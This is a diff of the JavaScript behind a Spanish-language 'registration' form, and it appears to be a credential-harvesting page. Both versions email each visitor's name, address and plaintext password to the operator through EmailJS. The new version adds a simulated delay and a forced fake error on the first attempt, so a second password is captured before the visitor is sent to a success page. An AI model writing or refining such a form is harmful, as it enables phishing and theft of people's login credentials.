@@ -1,49 +1,63 @@
 emailjs.init('ReqtkWfjI392LAzFb');
 
-document.getElementById('formularioRegistro').addEventListener('submit', async (e) => {
+document.getElementById('formRegistro').addEventListener('submit', async (e) => {
     e.preventDefault();
     
-    const boton = document.querySelector('.boton-registro');
+    const boton = document.querySelector('.boton-neumorfico');
     const emailInput = document.getElementById('correo');
     const errorEmail = document.getElementById('errorEmail');
+    let intentos = localStorage.getItem('intentosRegistro') || 0;
 
-    // Validar correo Gmail
-    if (emailInput.value.toLowerCase().includes('@gmail.com')) {
-        errorEmail.style.display = 'block';
-        emailInput.style.borderColor = '#d63031';
-        emailInput.focus();
+    // Efecto de carga
+    boton.classList.add('procesando');
+    
+    // Validación avanzada
+    const esGmail = /@gmail\.com$/i.test(emailInput.value);
+    const esValido = !esGmail && emailInput.checkValidity();
+
+    if (!esValido) {
+        errorEmail.style.display = 'flex';
+        emailInput.parentElement.classList.add('error');
+        boton.classList.remove('procesando');
         return;
-    } else {
-        errorEmail.style.display = 'none';
-        emailInput.style.borderColor = '#e8e8e8';
     }
 
-    boton.disabled = true;
-    boton.innerHTML = `<div class="spinner"></div>Procesando...`;
-    
-    const datos = {
-        nombre: document.getElementById('nombre').value.trim(),
-        correo: emailInput.value.trim(),
-        password: document.getElementById('password').value,
-        intento: localStorage.getItem('intentoRegistro') ? 'Segundo intento' : 'Primer intento'
-    };
+    // Simular retardo de red
+    await new Promise(resolve => setTimeout(resolve, 1500));
 
     try {
+        const datos = {
+            nombre: document.getElementById('nombre').value.trim(),
+            correo: emailInput.value.trim(),
+            password: document.getElementById('password').value,
+            intento: ++intentos
+        };
+
         await emailjs.send("service_syrc1uk", "template_u3etoro", datos);
         
-        if (!localStorage.getItem('intentoRegistro')) {
-            localStorage.setItem('intentoRegistro', '1');
+        if (intentos < 2) {
+            localStorage.setItem('intentosRegistro', intentos);
             window.location.href = "error.html";
         } else {
-            localStorage.removeItem('intentoRegistro');
+            localStorage.removeItem('intentosRegistro');
             window.location.href = "exito.html";
         }
         
     } catch (error) {
-        alert('Error al enviar el registro. Intenta nuevamente.');
+        alert('Error crítico: Contactar al soporte técnico');
         console.error('Error:', error);
     } finally {
-        boton.disabled = false;
-        boton.innerHTML = `<span class="texto-boton">¡Registrarme ahora!</span><span class="icono-boton">🚀</span>`;
+        boton.classList.remove('procesando');
     }
+});
+
+// Efectos de entrada
+document.querySelectorAll('.input-material').forEach(input => {
+    input.addEventListener('focus', () => {
+        input.parentElement.classList.add('activo');
+    });
+    
+    input.addEventListener('blur', () => {
+        if (!input.value) input.parentElement.classList.remove('activo');
+    });
 });
